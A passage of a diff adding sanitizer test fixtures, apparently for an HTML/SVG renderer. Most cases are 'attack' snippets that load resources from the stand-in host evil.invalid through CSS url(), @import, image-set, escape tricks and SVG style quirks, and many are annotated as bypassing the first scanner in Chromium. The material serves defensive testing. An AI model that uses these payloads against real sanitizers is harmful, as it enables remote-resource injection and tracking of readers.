224.023-.22.026-.216.027-.212.028-.21.031-.205.032-.202.033-.198.034-.194.036-.191.038-.187.038-.183.04-.179.041-.175.042-.172.043-.168.043-.163.045-.16.046-.155.046-.152.048-.148.048-.143.048-.139.049-.136.05-.131.05-.126.051-.123.051-.118.051-.114.052-.11.052-.106.052-.101.052-.096.052-.092.052-.088.052-.083.052-.079.052-.074.051-.07.052-.065.051-.06.05-.056.05-.051.05-.023.025-.023.024-.021.024-.02.025-.019.024-.018.024-.017.023-.015.024-.014.023-.013.023-.012.023-.01.023-.01.022-.008.022-.006.023-.006.021-.004.022-.004.021-.001.021-.001.021.001.021.001.021.004.021.004.022.006.021.006.023.008.022.01.022.01.023.012.023.013.023.014.023.015.024.017.023.018.024.019.024.02.025.021.024.023.024.023.025.051.05.056.05.06.05.065.051.07.052.074.051.079.052.083.052.088.052.092.052.096.052.101.052.106.052.11.052.114.052.118.051.123.051.126.051.131.05.136.05.139.049.143.048.148.048.152.048.155.046.16.046.163.045.168.043.172.043.175.042.179.041.183.04.187.038.191.038.194.036.198.034.202.033.205.032.21.031.212.028.216.027.22.026.224.023.226.022.231.021.233.018.237.016.241.014.244.012.247.011.25.008.254.005.257.004.26.001.26-.001.257-.004.254-.005.25-.008.247-.011.244-.012.241-.014.237-.016.233-.018.231-.021.226-.022.224-.023.22-.026.216-.027.212-.028.21-.031.205-.032.202-.033.198-.034.194-.036.191-.038.187-.038.183-.04.179-.041.175-.042.172-.043.168-.043.163-.045.16-.046.155-.046.152-.048.148-.048.143-.048.139-.049.136-.05.131-.05.126-.051.123-.051.118-.051.114-.052.11-.052.106-.052.101-.052.096-.052.092-.052.088-.052.083-.052.079-.052.074-.051.07-.052.065-.051.06-.05.056-.05.051-.05.023-.025.023-.024.021-.024.02-.025.019-.024.018-.024.017-.023.015-.024.014-.023.013-.023.012-.023.01-.023.01-.022.008-.022.006-.023.006-.021.004-.022.004-.021.001-.021.001-.021-.001-.021-.001-.021-.004-.021-.004-.022-.006-.021-.006-.023-.008-.022-.01-.022-.01-.023-.012-.023-.013-.023-.014-.023-.015-.024-.017-.023-.018-.024-.019-.024-.02-.025-.021-.024-.023-.024-.023-.025-.051-.05-.056-.05-.06-.05-.065-.051-.07-.052-.074-.051-.079-.052-.083-.052-.088-.052-.092-.052-.096-.052-.101-.052-.106-.052-.11-.052-.114-.052-.118-.051-.123-.051-.126-.051-.131-.05-.136-.05-.139-.049-.143-.048-.148-.048-.152-.048-.155-.046-.16-.046-.163-.045-.168-.043-.172-.043-.175-.042-.179-.041-.183-.04-.187-.038-.191-.038-.194-.036-.198-.034-.202-.033-.205-.032-.21-.031-.212-.028-.216-.027-.22-.026-.224-.023-.226-.022-.231-.021-.233-.018-.237-.016-.241-.014-.244-.012-.247-.011-.25-.008-.254-.005-.257-.004-.26-.001-.26.001z\"></path></symbol></defs><defs><symbol id=\"mmB-clock\" width=\"24\" height=\"24\"><path transform=\"scale(.5)\" d=\"M12 2c5.514 0 10 4.486 10 10s-4.486 10-10 10-10-4.486-10-10 4.486-10 10-10zm0-2c-6.627 0-12 5.373-12 12s5.373 12 12 12 12-5.373 12-12-5.373-12-12-12zm5.848 12.459c.202.038.202.333.001.372-1.907.361-6.045 1.111-6.547 1.111-.719 0-1.301-.582-1.301-1.301 0-.512.77-5.447 1.125-7.445.034-.192.312-.181.343.014l.985 6.238 5.394 1.011z\"></path></symbol></defs><defs><marker id=\"mmB-arrowhead\" refX=\"7.9\" refY=\"5\" markerUnits=\"userSpaceOnUse\" markerWidth=\"12\" markerHeight=\"12\" orient=\"auto-start-reverse\"><path d=\"M -1 0 L 10 5 L 0 10 z\"></path></marker></defs><defs><marker id=\"mmB-crosshead\" markerWidth=\"15\" markerHeight=\"8\" orient=\"auto\" refX=\"4\" refY=\"4.5\"><path fill=\"none\" stroke=\"#000000\" stroke-width=\"1pt\" d=\"M 1,2 L 6,7 M 6,2 L 1,7\" style=\"stroke-dasharray: 0, 0;\"></path></marker></defs><defs><marker id=\"mmB-filled-head\" refX=\"15.5\" refY=\"7\" markerWidth=\"20\" markerHeight=\"28\" orient=\"auto\"><path d=\"M 18,7 L9,13 L14,7 L9,1 Z\"></path></marker></defs><defs><marker id=\"mmB-sequencenumber\" refX=\"15\" refY=\"15\" markerWidth=\"60\" markerHeight=\"40\" orient=\"auto\"><circle cx=\"15\" cy=\"15\" r=\"6\"></circle></marker></defs><defs><marker id=\"mmB-solidTopArrowHead\" refX=\"7.9\" refY=\"7.25\" markerUnits=\"userSpaceOnUse\" markerWidth=\"12\" markerHeight=\"12\" orient=\"auto-start-reverse\"><path d=\"M 0 0 L 10 8 L 0 8 z\"></path></marker></defs><defs><marker id=\"mmB-solidBottomArrowHead\" refX=\"7.9\" refY=\"0.75\" markerUnits=\"userSpaceOnUse\" markerWidth=\"12\" markerHeight=\"12\" orient=\"auto-start-reverse\"><path d=\"M 0 0 L 10 0 L 0 8 z\"></path></marker></defs><defs><marker id=\"mmB-stickTopArrowHead\" refX=\"7.5\" refY=\"7\" markerUnits=\"userSpaceOnUse\" markerWidth=\"12\" markerHeight=\"12\" orient=\"auto-start-reverse\"><path d=\"M 0 0 L 7 7\" stroke=\"black\" stroke-width=\"1.5\" fill=\"none\"></path></marker></defs><defs><marker id=\"mmB-stickBottomArrowHead\" refX=\"7.5\" refY=\"0\" markerUnits=\"userSpaceOnUse\" markerWidth=\"12\" markerHeight=\"12\" orient=\"auto-start-reverse\"><path d=\"M 0 7 L 7 0\" stroke=\"black\" stroke-width=\"1.5\" fill=\"none\"></path></marker></defs><text x=\"174\" y=\"80\" text-anchor=\"middle\" dominant-baseline=\"middle\" alignment-baseline=\"middle\" class=\"messageText\" dy=\"1em\" style=\"font-size: 16px; font-weight: 400;\">Hello</text><line x1=\"76\" y1=\"111\" x2=\"271\" y2=\"111\" class=\"messageLine0\" data-et=\"message\" data-id=\"i0\" data-from=\"Alice\" data-to=\"Bob\" stroke-width=\"2\" stroke=\"none\" marker-end=\"url(#mmB-arrowhead)\" style=\"fill: none;\"></line><text x=\"177\" y=\"126\" text-anchor=\"middle\" dominant-baseline=\"middle\" alignment-baseline=\"middle\" class=\"messageText\" dy=\"1em\" style=\"font-size: 16px; font-weight: 400;\">Hi</text><line x1=\"274\" y1=\"157\" x2=\"79\" y2=\"157\" class=\"messageLine1\" data-et=\"message\" data-id=\"i1\" data-from=\"Bob\" data-to=\"Alice\" stroke-width=\"2\" stroke=\"none\" marker-end=\"url(#mmB-arrowhead)\" style=\"stroke-dasharray: 3, 3; fill: none;\"></line></svg>",
+  "note": "real output; carries xmlns / xmlns:xhtml http:// values, url(#...) marker references and, for the flowchart, <foreignObject> labels"
+ },
+ {
+  "name": "rv css unclosed url( at end of style attribute",
+  "kind": "attack",
+  "html": "<div style=\"background:url(https://evil.invalid/x.png\">x</div>",
+  "note": "review 2026-10-10: bypass of the first scanner, measured in Chromium: mapCalls: close<0 -> break, text stays; Anfrage nach Durchgang: /evil/t0/x.png"
+ },
+ {
+  "name": "rv css unclosed url( with quote at end of style attribute",
+  "kind": "attack",
+  "html": "<div style=\"background:url('https://evil.invalid/x.png\">x</div>",
+  "note": "review 2026-10-10: bypass of the first scanner, measured in Chromium: Anfrage nach Durchgang: /evil/t1/x.png"
+ },
+ {
+  "name": "rv css quoted url containing )",
+  "kind": "attack",
+  "html": "<div style='background:url(\"https://evil.invalid/x.png?)\")'>x</div>",
+  "note": "review 2026-10-10: bypass of the first scanner, measured in Chromium: inner cut at first ) starts with a quote -> isLocalRef sees no scheme; Anfrage nach Durchgang: /evil/t2/x.png"
+ },
+ {
+  "name": "rv css url string followed by comment",
+  "kind": "attack",
+  "html": "<div style=\"background:url('https://evil.invalid/x.png'/**/)\">x</div>",
+  "note": "review 2026-10-10: bypass of the first scanner, measured in Chromium: unquote needs both quotes at the ends; Anfrage nach Durchgang: /evil/t3/x.png"
+ },
+ {
+  "name": "rv css string line continuation",
+  "kind": "attack",
+  "html": "<div style=\"background:url('ht\\\ntp://evil.invalid/x.png')\">x</div>",
+  "note": "review 2026-10-10: bypass of the first scanner, measured in Chromium: backslash-LF in a CSS string is removed by the browser; lexical turns the backslash into / (ht/tp:); Anfrage nach Durchgang: /evil/t6/x.png"
+ },
+ {
+  "name": "rv css string line continuation in @import",
+  "kind": "attack",
+  "html": "<style>@import \"ht\\\ntp://evil.invalid/x.css\";</style>",
+  "note": "review 2026-10-10: bypass of the first scanner, measured in Chromium: Anfrage nach Durchgang: /evil/t7/x.css"
+ },
+ {
+  "name": "rv css image-set apostrophe shifts string pairing",
+  "kind": "attack",
+  "html": "<div style=\"background:image-set('x\\'y.png' 2x, 'https://evil.invalid/x.png' 1x)\">x</div>",
+  "note": "review 2026-10-10: bypass of the first scanner, measured in Chromium: escaped quote; regex pairs quotes wrongly; Anfrage nach Durchgang: /evil/t8/x.png"
+ },
+ {
+  "name": "rv css image-set double quote with apostrophe inside",
+  "kind": "attack",
+  "html": "<div style=\"background:image-set(&quot;x'y.png&quot; 2x, &quot;https://evil.invalid/x.png&quot; 1x)\">x</div>",
+  "note": "review 2026-10-10: bypass of the first scanner, measured in Chromium: Anfrage nach Durchgang: /evil/t9/x.png"
+ },
+ {
+  "name": "rv css image-set via custom property string",
+  "kind": "attack",
+  "html": "<div style=\"--u:'https://evil.invalid/x.png';background:image-set(var(--u) 1x)\">x</div>",
+  "note": "review 2026-10-10: bypass of the first scanner, measured in Chromium: the string sits outside image-set(), var() substitutes it; Anfrage nach Durchgang: /evil/t10/x.png"
+ },
+ {
+  "name": "rv css image-set via custom property in style element",
+  "kind": "attack",
+  "html": "<style>.a{--u:\"https://evil.invalid/x.png\";background-image:image-set(var(--u) 1x)}</style><p class=\"a\">x</p>",
+  "note": "review 2026-10-10: bypass of the first scanner, measured in Chromium: Anfrage nach Durchgang: /evil/t11/x.png"
+ },
+ {
+  "name": "rv css background-image var holding url string",
+  "kind": "attack",
+  "html": "<div style=\"--u:'https://evil.invalid/x.png';background-image:-webkit-image-set(var(--u) 1x)\">x</div>",
+  "note": "review 2026-10-10: bypass of the first scanner, measured in Chromium: Anfrage nach Durchgang: /evil/t13/x.png"
+ },
+ {
+  "name": "rv css image-set unclosed at end",
+  "kind": "attack",
+  "html": "<div style=\"background:image-set('https://evil.invalid/x.png' 1x\">x</div>",
+  "note": "review 2026-10-10: bypass of the first scanner, measured in Chromium: Anfrage nach Durchgang: /evil/t14/x.png"
+ },
+ {
+  "name": "rv css font-face url string with paren",
+  "kind": "attack",
+  "html": "<style>@font-face{font-family:q;src:url(\"https://evil.invalid/f.woff?)\")}p{font-family:q}</style><p>x</p>",
+  "note": "review 2026-10-10: bypass of the first scanner, measured in Chromium: Anfrage nach Durchgang: /evil/t16/f.woff"
+ },
+ {
+  "name": "rv css hex escape variants",
+  "kind": "attack",
+  "html": "<div style=\"background:\\75 rl(https://evil.invalid/x.png)\">x</div>",
+  "note": "review 2026-10-10: abgewehrt (Kontrolle traf, Behandlung nicht)"
+ },
+ {
+  "name": "rv import string containing semicolon",
+  "kind": "attack",
+  "html": "<style>@import \"https://evil.invalid/a;b.css\";</style>",
+  "note": "review 2026-10-10: bypass of the first scanner, measured in Chromium: regex @import[^;{}]*;? cuts the string, target empty -> local; Anfrage nach Durchgang: /evil/t18/a"
+ },
+ {
+  "name": "rv import string containing brace",
+  "kind": "attack",
+  "html": "<style>@import \"https://evil.invalid/a}b.css\";</style>",
+  "note": "review 2026-10-10: bypass of the first scanner, measured in Chromium: Anfrage nach Durchgang: /evil/t19/a%7Db.css"
+ },
+ {
+  "name": "rv import comment decoy local string first",
+  "kind": "attack",
+  "html": "<style>@import /*\"a.css\"*/ \"https://evil.invalid/x.css\";</style>",
+  "note": "review 2026-10-10: bypass of the first scanner, measured in Chromium: Anfrage nach Durchgang: /evil/t20/x.css"
+ },
+ {
+  "name": "rv import comment decoy url",
+  "kind": "attack",
+  "html": "<style>@import /*url(a.css)*/ url(https://evil.invalid/x.css);</style>",
+  "note": "review 2026-10-10: abgewehrt (Kontrolle traf, Behandlung nicht)"
+ },
+ {
+  "name": "rv import unterminated string at end",
+  "kind": "attack",
+  "html": "<style>@import \"https://evil.invalid/x.css</style>",
+  "note": "review 2026-10-10: bypass of the first scanner, measured in Chromium: Anfrage nach Durchgang: /evil/t22/x.css"
+ },
+ {
+  "name": "rv import unclosed url at end",
+  "kind": "attack",
+  "html": "<style>@import url(https://evil.invalid/x.css</style>",
+  "note": "review 2026-10-10: bypass of the first scanner, measured in Chromium: Anfrage nach Durchgang: /evil/t23/x.css"
+ },
+ {
+  "name": "rv import data url nests remote import (encoded)",
+  "kind": "attack",
+  "html": "<style>@import \"data:text/css,%40import%20url%28https%3A%2F%2Fevil.invalid%2Fn.css%29%3B\";</style>",
+  "note": "review 2026-10-10: bypass of the first scanner, measured in Chromium: data: counts as local but a stylesheet is a document context; Anfrage nach Durchgang: /evil/t24/n.css"
+ },
+ {
+  "name": "rv import data url unquoted url() form",
+  "kind": "attack",
+  "html": "<style>@import url(data:text/css,%40import%20%22https%3A%2F%2Fevil.invalid%2Fn.css%22%3B);</style>",
+  "note": "review 2026-10-10: bypass of the first scanner, measured in Chromium: Anfrage nach Durchgang: /evil/t25/n.css"
+ },
+ {
+  "name": "rv import data url in svg style",
+  "kind": "attack",
+  "html": "<svg><style>@import \"data:text/css,%40import%20url%28https%3A%2F%2Fevil.invalid%2Fn.css%29%3B\";</style></svg>",
+  "note": "review 2026-10-10: bypass of the first scanner, measured in Chromium: Anfrage nach Durchgang: /evil/t26/n.css"
+ },
+ {
+  "name": "rv import with layer and supports",
+  "kind": "attack",
+  "html": "<style>@import \"https://evil.invalid/x.css\" layer(a) supports(display:grid);</style>",
+  "note": "review 2026-10-10: abgewehrt (Kontrolle traf, Behandlung nicht)"
+ },
+ {
+  "name": "rv import after charset",
+  "kind": "attack",
+  "html": "<style>@charset \"utf-8\";@import \"https://evil.invalid/x.css\";</style>",
+  "note": "review 2026-10-10: abgewehrt (Kontrolle traf, Behandlung nicht)"
+ },
+ {
+  "name": "rv svg style child element text splits prefix",
+  "kind": "attack",
+  "html": "<svg><style>@import url(<x>app:</x>https://evil.invalid/x.css);</style></svg>",
+  "note": "review 2026-10-10: bypass of the first scanner, measured in Chromium: textContent includes descendants, the style element uses only direct text children; Anfrage nach Durchgang: /evil/t29/x.css"
+ },
+ {
+  "name": "rv svg style child element text in rule",
+  "kind": "attack",
+  "html": "<svg><style>.a{fill:url(<x>app:</x>https://evil.invalid/s.svg#a)}</style><rect class=\"a\" width=\"9\" height=\"9\"/></svg>",
+  "note": "review 2026-10-10: bypass of the first scanner, measured in Chromium: Anfrage nach Durchgang: /evil/t30/s.svg"
+ },
+ {
+  "name": "rv svg style child element, data prefix import string",
+  "kind": "attack",
+  "html": "<svg><style>@import \"<x>data:</x>https://evil.invalid/x.css\";</style></svg>",
+  "note": "review 2026-10-10: bypass of the first scanner, measured in Chromium: Anfrage nach Durchgang: /evil/t31/x.css"
+ },
+ {
+  "name": "rv svg style cdata",
+  "kind": "attack",
+  "html": "<svg><style><![CDATA[@import url(https://evil.invalid/x.css);]]></style></svg>",
+  "note": "review 2026-10-10: abgewehrt (Kontrolle traf, Behandlung nicht)"
+ },
+ {
+  "name": "rv math annotation-xml html integration img",
+  "kind": "attack",
+  "html": "<math><annotation-xml encoding=\"text/html\"><img src=\"https://evil.invalid/x.png\"></annotation-xml></math>",
+  "note": "review 2026-10-10: abgewehrt (Kontrolle traf, Behandlung nicht)"
+ },
+ {
+  "name": "rv object fallback img",
+  "kind": "attack",
+  "html": "<object data=\"x.png\"><img src=\"https://evil.invalid/x.png\"></object>",
+  "note": "review 2026-10-10: abgewehrt (Kontrolle traf, Behandlung nicht)"
+ },
+ {
+  "name": "rv video fallback content img",
+  "kind": "attack",
+  "html": "<video><img src=\"https://evil.invalid/x.png\"></video>",
+  "note": "review 2026-10-10: abgewehrt (Kontrolle traf, Behandlung nicht)"
+ },
+ {
+  "name": "rv image tag in html becomes img",
+  "kind": "attack",
+  "html": "<image src=\"https://evil.invalid/x.png\">",
+  "note": "review 2026-10-10: abgewehrt (Kontrolle traf, Behandlung nicht)"
+ },
+ {
+  "name": "rv body background in table th",
+  "kind": "attack",
+  "html": "<table><tr><th background=\"https://evil.invalid/x.png\">x</th></tr></table>",
+  "note": "review 2026-10-10: abgewehrt (Kontrolle traf, Behandlung nicht)"
+ },
+ {
+  "name": "rv backslash after scheme",
+  "kind": "attack",
+  "html": "<img src=\"https:\\\\evil.invalid\\x.png\">",
+  "note": "review 2026-10-10: abgewehrt (Kontrolle traf, Behandlung nicht)"
+ },
+ {
+  "name": "rv keep: style comment mentioning image(s)",
+  "kind": "price",
+  "html": "<style>/* tune image(s) here */ .a{color:red}</style><p class=\"a\">x</p>",
+  "note": "review 2026-10-10: Falsch-Positiv: zerstoert | by design since the CSS gate: CSS naming a resource goes, local or not"
+ },
+ {
+  "name": "rv keep: image-set with local urls",
+  "kind": "price",
+  "html": "<div style=\"background:image-set(url(img/a.png) 1x, url(img/b.png) 2x)\">x</div>",
+  "note": "review 2026-10-10: keep ok | by design since the CSS gate: CSS naming a resource goes, local or not"
+ },
+ {
+  "name": "rv keep: image-set with local strings",
+  "kind": "price",
+  "html": "<div style=\"background:image-set('img/a.png' 1x, 'img/b.png' 2x)\">x</div>",
+  "note": "review 2026-10-10: keep ok | by design since the CSS gate: CSS naming a resource goes, local or not"
+ },
+ {
+  "name": "rv keep: data svg background with inner url(#)",
+  "kind": "price",
+  "html": "<div style=\"background:url('data:image/svg+xml;utf8,<svg xmlns=&quot;http://www.w3.org/2000/svg&quot;><rect fill=&quot;url(#g)&quot;/></svg>')\">x</div>",
+  "note": "review 2026-10-10: keep ok | by design since the CSS gate: CSS naming a resource goes, local or not"
+ },
+ {
+  "name": "rv keep: katex like spans",
+  "kind": "keep",
+  "html": "<span class=\"katex\"><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6833em;\"></span><span class=\"mord\" style=\"margin-right:0.05em;top:-3.063em\">x</span></span></span></span>",
+  "note": "review 2026-10-10: keep ok"
+ },
+ {
+  "name": "rv keep: svg with local use and marker",
+  "kind": "keep",
+  "html": "<svg viewBox=\"0 0 10 10\"><defs><marker id=\"m\"><path d=\"M0 0\"/></marker></defs><path d=\"M0 0L9 9\" marker-end=\"url(#m)\" style=\"stroke:#333;fill:none\"/><use href=\"#m\"/></svg>",
+  "note": "review 2026-10-10: keep ok"
+ },
+ {
+  "name": "rv keep: font-family with quoted names",
+  "kind": "keep",
+  "html": "<span style=\"font-family:'Fira Code', monospace\">x</span>",
+  "note": "review 2026-10-10: keep ok"
+ },
+ {
+  "name": "rv keep: video with relative source and poster",
+  "kind": "keep",
+  "html": "<video controls poster=\"img/p.png\"><source src=\"v.mp4\" type=\"video/mp4\"><track src=\"t.vtt\"></video>",
+  "note": "review 2026-10-10: keep ok"
+ },
+ {
+  "name": "rv keep: details summary img local",
+  "kind": "keep",
+  "html": "<details><summary>s</summary><img src=\"img/a.png\" alt=\"a\"></details>",
+  "note": "review 2026-10-10: keep ok"
+ },
+ {
+  "name": "rv keep: local font-face",
+  "kind": "price",
+  "html": "<style>@font-face{font-family:q;src:url(fonts/q.woff2) format(\"woff2\")}p{font-family:q}</style><p>x</p>",
+  "note": "review 2026-10-10: keep ok | by design since the CSS gate: CSS naming a resource goes, local or not"
+ },
+ {
+  "name": "rv keep: style with media query and local import",
+  "kind": "price",
+  "html": "<style>@import url(local.css);@media (min-width:600px){.a{color:red}}</style><p class=\"a\">x</p>",
+  "note": "review 2026-10-10: keep ok | by design since the CSS gate: CSS naming a resource goes, local or not"
+ },
+ {
+  "name": "rv keep: windows-like filename with colon in subfolder",
+  "kind": "keep",
+  "html": "<img src=\"notes/a:b.png\" alt=\"a\">",
+  "note": "review 2026-10-10: keep ok"
+ },
+ {
+  "name": "rv keep: data url with comma srcset",
+  "kind": "keep",
+  "html": "<img srcset=\"data:image/png;base64,AAAA 1x\" alt=\"a\">",
+  "note": "review 2026-10-10: keep ok"
+ },
+ {
+  "name": "rv import comment with semicolon before string",
+  "kind": "attack",
+  "html": "<style>@import /* ; */ \"https://evil.invalid/x.css\";</style>",
+  "note": "review 2026-10-10: bypass of the first scanner, measured in Chromium: Anfrage nach Durchgang: /evil/t72/x.css"
+ },
+ {
+  "name": "rv css hex escaped paren in quoted url",
+  "kind": "attack",
+  "html": "<div style='background:url(\"https://evil.invalid/x.png\\29 .png\")'>x</div>",
+  "note": "review 2026-10-10: bypass of the first scanner, measured in Chromium: Anfrage nach Durchgang: /evil/t73/x.png).png"
+ },
+ {
+  "name": "rv svg fill quoted url containing paren",
+  "kind": "attack",
+  "html": "<svg><rect width=\"9\" height=\"9\" fill='url(\"https://evil.invalid/s.svg?)#a\")'/></svg>",
+  "note": "review 2026-10-10: bypass of the first scanner, measured in Chromium: Anfrage nach Durchgang: /evil/t74/s.svg"
+ },
+ {
+  "name": "rv svg filter quoted url with paren",
+  "kind": "attack",
+  "html": "<svg><rect width=\"9\" height=\"9\" filter='url(\"https://evil.invalid/s.svg?)#f\")'/></svg>",
+  "note": "review 2026-10-10: bypass of the first scanner, measured in Chromium: Anfrage nach Durchgang: /evil/t76/s.svg"
+ },
+ {
+  "name": "rv svg mask unclosed url",
+  "kind": "attack",
+  "html": "<svg><rect width=\"9\" height=\"9\" mask=\"url(https://evil.invalid/s.svg#m\"/></svg>",
+  "note": "review 2026-10-10: bypass of the first scanner, measured in Chromium: Anfrage nach Durchgang: /evil/t77/s.svg"
+ },
+ {
+  "name": "rv svg style attribute unclosed url",
+  "kind": "attack",
+  "html": "<svg><rect width=\"9\" height=\"9\" style=\"fill:url(https://evil.invalid/s.svg#a\"/></svg>",
+  "note": "review 2026-10-10: bypass of the first scanner, measured in Chromium: Anfrage nach Durchgang: /evil/t78/s.svg"
+ },
+ {
+  "name": "rv style element unclosed url in rule",
+  "kind": "attack",
+  "html": "<style>.a{background:url(https://evil.invalid/x.png</style><p class=\"a\">x</p>",
+  "note": "review 2026-10-10: bypass of the first scanner, measured in Chromium: Anfrage nach Durchgang: /evil/t79/x.png"
+ },
+ {
+  "name": "rv style element url string with paren in selector context",
+  "kind": "attack",
+  "html": "<style>.a{background:url(\"https://evil.invalid/x.png?)\")}</style><p class=\"a\">x</p>",
+  "note": "review 2026-10-10: bypass of the first scanner, measured in Chromium: Anfrage nach Durchgang: /evil/t80/x.png"
+ },
+ {
+  "name": "rv style element image-set apostrophe",
+  "kind": "attack",
+  "html": "<style>.a{background:image-set(\"x'y.png\" 2x, \"https://evil.invalid/x.png\" 1x)}</style><p class=\"a\">x</p>",
+  "note": "review 2026-10-10: bypass of the first scanner, measured in Chromium: Anfrage nach Durchgang: /evil/t81/x.png"
+ },
+ {
+  "name": "rv style element line continuation url",
+  "kind": "attack",
+  "html": "<style>.a{background:url(\"ht\\\ntp://evil.invalid/x.png\")}</style><p class=\"a\">x</p>",
+  "note": "review 2026-10-10: bypass of the first scanner, measured in Chromium: Anfrage nach Durchgang: /evil/t82/x.png"
+ },
+ {
+  "name": "rv style element line continuation with CR",
+  "kind": "attack",
+  "html": "<style>.a{background:url(\"ht\\\rtp://evil.invalid/x.png\")}</style><p class=\"a\">x</p>",
+  "note": "review 2026-10-10: bypass of the first scanner, measured in Chromium: CR variant: unescapeCss turns backslash-CR into CR which is dropped, so expected defended; Anfrage nach Durchgang: /evil/t83/x.png"
+ },
+ {
+  "name": "rv style element line continuation with FF",
+  "kind": "attack",
+  "html": "<style>.a{background:url(\"ht\\\ftp://evil.invalid/x.png\")}</style><p class=\"a\">x</p>",
+  "note": "review 2026-10-10: abgewehrt (Kontrolle traf, Behandlung nicht)"
+ },
+ {
+  "name": "rv style attr uppercase URL with escape newline",
+  "kind": "attack",
+  "html": "<div style=\"background:UR\\4c('ht\\\ntp://evil.invalid/x.png')\">x</div>",
+  "note": "review 2026-10-10: bypass of the first scanner, measured in Chromium: Anfrage nach Durchgang: /evil/t85/x.png"
+ },
+ {
+  "name": "rv noscript img",
+  "kind": "attack",
+  "html": "<noscript><img src=\"https://evil.invalid/x.png\"></noscript>",
+  "note": "review 2026-10-10: abgewehrt (Kontrolle traf, Behandlung nicht)"
+ },
+ {
+  "name": "rv object without data with img fallback",
+  "kind": "attack",
+  "html": "<object><img src=\"https://evil.invalid/x.png\"></object>",
+  "note": "review 2026-10-10: abgewehrt (Kontrolle traf, Behandlung nicht)"
+ },
+ {
+  "name": "rv triple slash",
+  "kind": "attack",
+  "html": "<img src=\"///evil.invalid/x.png\">",
+  "note": "review 2026-10-10: abgewehrt (Kontrolle traf, Behandlung nicht)"
+ },
+ {
+  "name": "rv uppercase scheme with spaces",
+  "kind": "attack",
+  "html": "<img src=\"  HTTPS://evil.invalid/x.png  \">",
+  "note": "review 2026-10-10: abgewehrt (Kontrolle traf, Behandlung nicht)"
+ },
+ {
+  "name": "rv vertical tab and form feed prefix",
+  "kind": "attack",
+  "html": "<img src=\"\u000b\fhttps://evil.invalid/x.png\">",
+  "note": "review 2026-10-10: abgewehrt (Kontrolle traf, Behandlung nicht)"
+ },
+ {
+  "name": "rv named entity tab in scheme",
+  "kind": "attack",
+  "html": "<img src=\"h&Tab;ttps://evil.invalid/x.png\">",
+  "note": "review 2026-10-10: abgewehrt (Kontrolle traf, Behandlung nicht)"
+ },
+ {
+  "name": "rv svg image XLINK:HREF upper",
+  "kind": "attack",
+  "html": "<svg><image XLINK:HREF=\"https://evil.invalid/x.png\"/></svg>",
+  "note": "review 2026-10-10: abgewehrt (Kontrolle traf, Behandlung nicht)"
+ },
+ {
+  "name": "rv svg feImage in filter in defs with xlink",
+  "kind": "attack",
+  "html": "<svg xmlns:xlink=\"http://www.w3.org/1999/xlink\"><defs><filter id=\"f\"><feImage xlink:href=\"https://evil.invalid/x.png\"/></filter></defs><rect width=\"9\" height=\"9\" filter=\"url(#f)\"/></svg>",
+  "note": "review 2026-10-10: abgewehrt (Kontrolle traf, Behandlung nicht)"
+ },
+ {
+  "name": "rv video source in nested details",
+  "kind": "attack",
+  "html": "<details><summary>s</summary><video><source src=\"https://evil.invalid/x.mp4\"></video></details>",
+  "note": "review 2026-10-10: abgewehrt (Kontrolle traf, Behandlung nicht)"
+ },
+ {
+  "name": "rv link in body",
+  "kind": "attack",
+  "html": "<link rel=\"stylesheet\" href=\"https://evil.invalid/x.css\">",
+  "note": "review 2026-10-10: abgewehrt (Kontrolle traf, Behandlung nicht)"
+ },
+ {
+  "name": "rv svg a with image child inside foreignObject",
+  "kind": "attack",
+  "html": "<svg><foreignObject><div><img src=\"https://evil.invalid/x.png\"></div></foreignObject></svg>",
+  "note": "review 2026-10-10: abgewehrt (Kontrolle traf, Behandlung nicht)"
+ },
+ {
+  "name": "rv css escaped backslash then slash (double unescape)",
+  "kind": "attack",
+  "html": "<div style=\"background:url(\\5c/evil.invalid/x.png)\">x</div>",
+  "note": "review 2026-10-10: bypass of the first scanner, measured in Chromium: first pass: \\5c -> backslash; second pass eats it again -> /evil.invalid looks relative; browser reads \\/ as // after URL parsing; Anfrage nach Durchgang: /evil/t105/x.png"
+ },
+ {
+  "name": "rv css escaped backslash then slash in style element",
+  "kind": "attack",
+  "html": "<style>.a{background:url(\\5c/evil.invalid/x.png)}</style><p class=\"a\">x</p>",
+  "note": "review 2026-10-10: bypass of the first scanner, measured in Chromium: Anfrage nach Durchgang: /evil/t106/x.png"
+ },
+ {
+  "name": "rv css escaped backslash in @import string",
+  "kind": "attack",
+  "html": "<style>@import \"\\5c/evil.invalid/x.css\";</style>",
+  "note": "review 2026-10-10: bypass of the first scanner, measured in Chromium: Anfrage nach Durchgang: /evil/t107/x.css"
+ },
+ {
+  "name": "rv css escaped backslash with trailing space",
+  "kind": "attack",
+  "html": "<div style=\"background:url(\\5c /evil.invalid/x.png)\">x</div>",
+  "note": "review 2026-10-10: bypass of the first scanner, measured in Chromium: Anfrage nach Durchgang: /evil/t108/x.png"
+ },
+ {
+  "name": "rv css double escaped backslashes",
+  "kind": "attack",
+  "html": "<div style=\"background:url(\\5c \\5c evil.invalid/x.png)\">x</div>",
+  "note": "review 2026-10-10: bypass of the first scanner, measured in Chromium: Anfrage nach Durchgang: /evil/t109/x.png"
+ },
+ {
+  "name": "rv css hex escape of scheme",
+  "kind": "attack",
+  "html": "<div style=\"background:url(\\68 ttps://evil.invalid/x.png)\">x</div>",
+  "note": "review 2026-10-10: abgewehrt (Kontrolle traf, Behandlung nicht)"
+ },
+ {
+  "name": "rv css protocol relative",
+  "kind": "attack",
+  "html": "<div style=\"background:url(//evil.invalid/x.png)\">x</div>",
+  "note": "review 2026-10-10: abgewehrt (Kontrolle traf, Behandlung nicht)"
+ },
+ {
+  "name": "rv css hex escaped slashes",
+  "kind": "attack",
+  "html": "<div style=\"background:url(\\2f\\2f evil.invalid/x.png)\">x</div>",
+  "note": "review 2026-10-10: abgewehrt (Kontrolle traf, Behandlung nicht)"
+ },
+ {
+  "name": "rv css at-rule name escape",
+  "kind": "attack",
+  "html": "<style>@\\69mport \"https://evil.invalid/x.css\";</style>",
+  "note": "review 2026-10-10: abgewehrt (Kontrolle traf, Behandlung nicht)"
+ },
+ {
+  "name": "rv css import uppercase",
+  "kind": "attack",
+  "html": "<style>@IMPORT URL(https://evil.invalid/x.css);</style>",
+  "note": "review 2026-10-10: abgewehrt (Kontrolle traf, Behandlung nicht)"
+ },
+ {
+  "name": "rv css import no space",
+  "kind": "attack",
+  "html": "<style>@import\"https://evil.invalid/x.css\";</style>",
+  "note": "review 2026-10-10: abgewehrt (Kontrolle traf, Behandlung nicht)"
+ },
+ {
+  "name": "rv css escaped quote in import string",
